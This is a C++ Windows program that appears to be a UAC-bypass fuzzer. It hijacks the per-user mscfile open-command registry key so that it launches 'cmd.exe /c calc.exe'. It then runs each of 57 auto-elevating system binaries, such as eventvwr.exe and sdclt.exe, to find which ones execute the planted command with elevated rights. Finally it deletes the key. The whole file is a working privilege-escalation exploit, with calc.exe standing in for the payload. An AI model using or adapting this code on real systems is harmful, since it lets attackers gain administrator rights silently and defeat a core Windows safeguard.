#include "stdafx.h"
#include <windows.h>

#define DATA_SIZE 1024
#define  AUTOELEVATE_COUNT 57

typedef VOID  (WINAPI * PFN_GetNativeSystemInfo)(OUT  LPSYSTEM_INFO);
typedef BOOL   (WINAPI * PFN_Wow64DisableWow64FsRedirection)(OUT  PVOID*);
typedef BOOL  (WINAPI * PFN_Wow64RevertWow64FsRedirection)(OUT  PVOID);

BOOL Is64System();
BOOL SetRegKeyStrVal(HKEY hKey,LPCSTR lpSubKey,LPCSTR lpData);
BOOL DeleteRegKey(HKEY hKey,LPCSTR lpSubKey);

BOOL Is64System()
{
	SYSTEM_INFO si = {0};
	
	PFN_GetNativeSystemInfo pfnGetNativeSystemInfo = \
		(PFN_GetNativeSystemInfo)GetProcAddress(GetModuleHandle("Kernel32.dll"), "GetNativeSystemInfo");
	
	if (pfnGetNativeSystemInfo)
	{
		pfnGetNativeSystemInfo(&si);

		if (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64 ||
			si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_IA64)
		{
			return TRUE;
		}
	}

	return FALSE;
}

BOOL SetRegKeyStrVal(HKEY hKey,LPCSTR lpSubKey,LPCSTR lpData)
{
	HKEY hRoot = NULL;
	DWORD dwDisposition = 0;
	DWORD cbData = 0;
	DWORD dwRet = 0;
	REGSAM samDesired = KEY_ALL_ACCESS;
	BYTE szBuffer[MAX_PATH] = {0};
	CHAR szSysDir[MAX_PATH] = {0};
	CHAR szCommand[MAX_PATH] = {0};
	
	if (Is64System())
	{
		samDesired |= KEY_WOW64_64KEY;
	}
	
	if ((RegCreateKeyEx(hKey, lpSubKey, 0, NULL, 0, samDesired,NULL, &hRoot,&dwDisposition)) != ERROR_SUCCESS)
	{
		return FALSE;
	}
	
	dwRet = RegQueryValueEx( hRoot,
		NULL,
		NULL,
		NULL,
		szBuffer,
		&cbData );
	
	if (dwRet == ERROR_SUCCESS || dwRet == ERROR_MORE_DATA)
	{
		RegDeleteKey(hKey,lpSubKey);
		RegCloseKey(hRoot);

		if ((RegCreateKeyEx(hKey, lpSubKey, 0, NULL, 0, samDesired,NULL, &hRoot,&dwDisposition)) != ERROR_SUCCESS)
		{
			return FALSE;
		}
	}
			
	if (RegSetValueEx(hRoot,NULL,0,REG_SZ, (BYTE *)lpData,strlen(lpData)))
	{
		return FALSE;
	}

	if (RegCloseKey(hRoot))
	{
		return FALSE;
	}

	return TRUE;
}

BOOL DeleteRegKey(HKEY hKey,LPCSTR lpSubKey)
{
	HKEY hRoot = NULL;
	DWORD  dwDisposition = 0;
	
	if (RegCreateKeyEx(HKEY_CURRENT_USER, lpSubKey, 0, NULL,0,KEY_ALL_ACCESS,NULL,&hRoot,&dwDisposition) != ERROR_SUCCESS)
		return FALSE;

	if (RegDeleteKey(hKey,lpSubKey) != ERROR_SUCCESS)
		return FALSE;

	if (RegCloseKey(hRoot) != ERROR_SUCCESS)
		return FALSE;

	return TRUE;
}

VOID Fuzzing()
{
	CHAR szAutoElevateExe[AUTOELEVATE_COUNT][MAX_PATH] = \
	{"AdapterTroubleshooter.exe",         
	"BitLockerWizardElev.exe",       
	"bthudtask.exe",           
	"chkntfs.exe",         
	"cleanmgr.exe",         
	"cliconfg.exe",         
	"CompMgmtLauncher.exe",             
	"ComputerDefaults.exe",         
	"dccw.exe",       
	"dcomcnfg.exe",           
	"DeviceEject.exe",             
	"DeviceProperties.exe",         
	"dfrgui.exe",         
	"djoin.exe",         
	"eudcedit.exe",         
	"eventvwr.exe",         
	"FXSUNATD.exe",           
	"hdwwiz.exe",             
	"iscsicli.exe",         
	"iscsicpl.exe",         
	"lpksetup.exe",         
	"MdSched.exe",             
	"msconfig.exe",         
	"msdt.exe",       
	"msra.exe",         
	"MultiDigiMon.exe",         
	"Netplwiz.exe",         
	"newdev.exe",         
	"ntprint.exe",         
	"ocsetup.exe",         
	"odbcad32.exe",             
	"OptionalFeatures.exe",         
	"perfmon.exe",       
	"printui.exe",             
	"rdpshell.exe",         
	"recdisc.exe",         
	"rrinstaller.exe",             
	"rstrui.exe",         
	"sdclt.exe",         
	"shrpubw.exe",         
	"slui.exe",         
	"SndVol.exe",             
	"SystemPropertiesAdvanced.exe",         
	"SystemPropertiesComputerName.exe",         
	"SystemPropertiesDataExecutionPrevention.exe",         
	"SystemPropertiesHardware.exe",         
	"SystemPropertiesPerformance.exe",         
	"SystemPropertiesProtection.exe",         
	"SystemPropertiesRemote.exe",         
	"taskmgr.exe",         
	"tcmsetup.exe",         
	"TpmInit.exe",             
	"verifier.exe",         
	"wisptis.exe",       
	"wusa.exe",             
	"oobe\\setupsqm.exe",         
	"sysprep\\sysprep.exe"};
	
	CHAR szSysDir[MAX_PATH] = {0};
	CHAR szSysCmd[DATA_SIZE] = {0};
	CHAR szData[DATA_SIZE] = {0};
	
	CONST CHAR* lpSubKey = "Software\\Classes\\mscfile\\shell\\open\\command";
	
	GetSystemDirectory(szSysDir, MAX_PATH);

	sprintf_s(szData, DATA_SIZE, "%s\\cmd.exe /c %s\\calc.exe",szSysDir, szSysDir);

	SetRegKeyStrVal(HKEY_CURRENT_USER , lpSubKey, szData);
	
	for (int i = 0; i < AUTOELEVATE_COUNT; i++)
	{	
		memset(szSysCmd, 0, DATA_SIZE);
		
		sprintf_s(szSysCmd, DATA_SIZE,"%s\\cmd.exe /c %s\\%s", szSysDir, szSysDir, szAutoElevateExe[i]);
		
		system(szSysCmd);
		
		printf("%d task %s is Done.\r\n", i, szSysCmd);
	}
	
	DeleteRegKey(HKEY_CURRENT_USER , lpSubKey);
}
		
int _tmain(int argc, _TCHAR* argv[])
{			
	if (Is64System())
	{	
		PFN_Wow64DisableWow64FsRedirection pfnWow64DisableWow64FsRedirection = \
			(PFN_Wow64DisableWow64FsRedirection)GetProcAddress(GetModuleHandle("Kernel32.dll"), "Wow64DisableWow64FsRedirection");
		
		PFN_Wow64RevertWow64FsRedirection pfnWow64RevertWow64FsRedirection = \
			(PFN_Wow64RevertWow64FsRedirection)GetProcAddress(GetModuleHandle("Kernel32.dll"), "Wow64RevertWow64FsRedirection");
		
		if (pfnWow64DisableWow64FsRedirection && pfnWow64RevertWow64FsRedirection)
		{
			PVOID OldValue;

			pfnWow64DisableWow64FsRedirection(&OldValue);
							
			Fuzzing();
			
			pfnWow64RevertWow64FsRedirection (OldValue);

			return 0;
		}
	}
	
	Fuzzing();

	return 0;
}

